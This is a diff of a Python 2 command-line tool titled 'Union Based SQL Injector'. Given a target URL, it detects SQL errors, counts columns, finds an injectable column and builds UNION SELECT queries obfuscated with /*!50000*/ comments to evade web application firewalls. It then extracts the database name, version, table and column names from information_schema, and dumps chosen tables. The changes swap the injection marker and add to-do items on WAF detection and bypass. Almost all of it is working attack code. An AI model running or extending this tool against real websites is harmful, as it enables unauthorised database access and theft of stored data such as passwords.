@@ -21,6 +21,15 @@ import logging
     ---
     Add WAF Detection and Bypass
 """
+"""
+TO DO LIST
+----------
+0x1: Implement a check for WAF
+0x2: Implement a check for ending url "--" or "--+-" or "--+--" or even "#"
+0x3: Format the table data nicely to print
+0x4: Maybe implement a session file for each site like sqlmap, to record 
+     vulnerable columns, databases, and tables, to enable --dump function.
+"""
 
 sql_Error = [
             "You have an error in your SQL syntax",
@@ -85,9 +94,8 @@ class website:
         parser = argparse.ArgumentParser(prog="Union Based SQL Injector",description="Union Based SQL injector")
         parser.add_argument("-t","--target", help="Target URL")
         parser.add_argument("-v","--verbose",help="Enable Verbose mode",action="store_true")
-        # -d, --dump disabled until further notice
-        # Until I figure out how to store logs to resume like sqlmap
-        #parser.add_argument("-d","--dump", help="Dump the following table")
+        # parser.add_argument("-i","--ignore",help="Ignore Saved Session",action="store_true")
+        # parser.add_argument("-d","--dump", help="Dump the following table")
         args = parser.parse_args()
 
         if args.target == None:
@@ -95,17 +103,13 @@ class website:
             sys.exit(1)
 
         elif args.target != None:
-
             if args.verbose:
                 logging.basicConfig(format="%(levelname)s: %(message)s", level=logging.DEBUG)
                 logging.info("Verbose mode Activated")
-                self.verbose = True
             else:
                 logging.basicConfig(format="%(levelname)s: %(message)s")
-
             try:
                 self.url = URL(args.target).fullurl
-
                 self.log = Log()
                 self.fingered = self.log.check_log(self.url)
 
@@ -117,10 +121,8 @@ class website:
                 else:
                     self.testError()
                     self.columnCounterGroupBy()
-                    # It'll automatically try Order By method if Group By doesn't work
                     self.FindVulnColumnAuto()
                     self.displayInfo()
-
             except KeyboardInterrupt:
                 print("\n[~] Exiting...")
             except Exception as e:
@@ -128,6 +130,9 @@ class website:
                 print("\n[!] Error Occured")
                 print(e)
                 sys.exit(1)
+
+        # elif args.dump != "":
+        #     self.
 
 
     def _initVar(self):
@@ -137,19 +142,15 @@ class website:
         self.url           = ""
         self.vulnerable    = False
         self.errorMessage  = ""
-        self.columnCount   = 0
+        self.columnCount   = 0  # The total number of columns
         self.vulnColumn    = [] # Vulnerable column could be more than one column
-        self.databases     = ""
-        self.tables        = []
-        self.unionUrl      = ""
-        self.columnRange   = []
+        self.databases     = "" # The database name, should implement it to react differently
+                                # if there is two or more database.
+        self.tables        = [] # A list to keep track of discovered tables
+        self.unionUrl      = "" # String to hold the Union url, which is universal
+        self.columnRange   = [] # The range of columns including '!' for vulnerable column
 
-        self.verbose       = False
         self.waf           = False
-        """ 
-        I will add waf bypass soon, as soon as I figure out
-        how to do that without repeating laborous manual query generation
-        """
 
     def testError(self):
         print(YELLOW+"[+] Testing webpage for sql errors"+END)
@@ -185,10 +186,9 @@ class website:
 
             logging.info(injUrl)
             page = self.getpage(injUrl)
-
-            if not self.verbose:
-                sys.stdout.write(str(" "+str(colno)))
-                sys.stdout.flush()
+            
+            sys.stdout.write(str(" "+str(colno)))
+            sys.stdout.flush()
 
             if msg in page:
                 print(GREEN+"\n[+] Column Count = %d" % colno)
@@ -264,9 +264,8 @@ class website:
                     self.vulnColumn.append(colno)
                     if not find_more_than_one_vuln_column: break
                 else:
-                    if not self.verbose:
-                        sys.stdout.write(str(" " + str(colno)))
-                        sys.stdout.flush()
+                    sys.stdout.write(str(" " + str(colno)))
+                    sys.stdout.flush()
 
         if len(self.vulnColumn) == 0:
             print(RED+"\n[-] Vulnerable column couldn't be found")
@@ -307,25 +306,28 @@ class website:
         User, hosts, version... etc
         """
         if self.unionUrl == "":
+        # Need to check if it is empty, since there could be union url in the log
             colnumbers = []
             for i in range(1,self.columnCount+1):
                 if i == self.vulnColumn[0]:
-                    colnumbers.append("!")
+                    # colnumbers.append("!")
+                    colnumbers.append("$")
                     # Mark injection point with '!'
+                    # Remark : ! will mess up with the WAF bypass /*! */
                 else: colnumbers.append(i)
 
-            self.unionUrl = self.url.strip("'").replace("=","=-") + "+/*!50000UnIoN*/+/*!50000AlL*/+/*!50000SeLeCt*/+"
+            self.unionUrl = self.url.replace("=","=-").strip("'") + "+/*!50000UnIoN*/+/*!50000AlL*/+/*!50000SeLeCt*/+"
             self.unionUrl += ",".join([str(i) for i in colnumbers])
 
             self.log.write_log(self.unionUrl)
 
         else:
-            pass        
+            pass
 
         # Replace injection point '!' with query
-        databaseUrl = self.unionUrl.replace('!',"group_concat(0x2e3a,database(),0x3a2e)")+"--"
-        versionUrl = self.unionUrl.replace('!',"group_concat(0x2e3a,@@version,0x3a2e)")+"--"
-        tableUrl = self.unionUrl.replace('!',"group_concat(0x2e3a,table_name,0x3a2e)").strip("--")
+        databaseUrl = self.unionUrl.replace('$',"group_concat(0x2e3a,database(),0x3a2e)")+"--"
+        versionUrl = self.unionUrl.replace('$',"group_concat(0x2e3a,@@version,0x3a2e)")+"--"
+        tableUrl = self.unionUrl.replace('$',"group_concat(0x2e3a,table_name,0x3a2e)").strip("--")
         tableUrl += "+from+information_schema.tables+where+table_schema=database()--"
 
         logging.info(databaseUrl)
@@ -333,7 +335,6 @@ class website:
         logging.info(tableUrl)
 
         try:
-
             self.version = self.parse(self.getpage(versionUrl))[0]
             print(GREEN+"\n[+] Version   : %s" % self.version)
 
@@ -354,7 +355,7 @@ class website:
 
     def dumpTable(self,table):
         print("\n[+] Dumping table : %s" % table)
-        columnUrl = self.unionUrl.replace('!',"group_concat(0x2e3a,column_name,0x3a2e)").strip("--") \
+        columnUrl = self.unionUrl.replace('$',"group_concat(0x2e3a,column_name,0x3a2e)").strip("--") \
         +"+from+information_schema.columns+where+table_name=" + "0x" + table.encode('hex') + "--"
 
         logging.info(columnUrl)
@@ -374,7 +375,7 @@ class website:
             # eg : 'group_concat(0x2e3a,id,0x7c,pass,0x7c,salt,0x3a2e'
             #                      .:   id   .  pass   .  salt   :.
             tail = "+from+%s--" % (self.databases+"."+table) 
-            query = self.unionUrl.replace('!',concat) + tail
+            query = self.unionUrl.replace('$',concat) + tail
 
             logging.info(query)
 
@@ -386,10 +387,12 @@ class website:
             print(GREEN+"\t"+"\n\t".join([str(i) for i in data]))
             print(YELLOW+"\t-------------------------------------"+END)
 
-        except Exception:
+        except Exception as e:
+            print("[-] Something went wrong")
             with open('debug.html','w') as cf:
                 cf.write(self.getpage(query))
             print("[!] Check debug.html")
+            logging.debug(e)
 
     def getpage(self, url):
         try:
@@ -403,21 +406,19 @@ class website:
             print(e)
             sys.exit(1)
 
-
     def menu(self):
         print(GREEN+"\n[+] Tables    : %s" % "\n\t\t".join([str(i) for i in self.tables]))
-
         tbl_choice = raw_input(GREEN+"\nEnter table name : ").lower()
-        if tbl_choice in self.tables:
+        if tbl_choice == "quit" or tbl_choice == "exit" or tbl_choice == "q" or tbl_choice == "e":
+            print(RED+"[~] Exiting"+END)
+            sys.exit(1)
+        elif tbl_choice in self.tables:
             self.dumpTable(tbl_choice)
             raw_input("Press Enter to go back")
             self.menu()
         elif tbl_choice not in self.tables:
             print("[!] Table name [%s] is not in database" % tbl_choice)
             self.menu()
-        elif tbl_choice == "quit" or tbl_choice == "exit":
-            print(RED+"[~] Exiting"+END)
-            sys.exit(1)    
 
 class Log:
     def __init__(self):
@@ -436,8 +437,6 @@ class Log:
         self.history = ""
 
         url = url[:url.index("=")]
-        # Take only the left portion of the url, since the log only records
-        # The union url
 
         for item in data:
             if url in item:
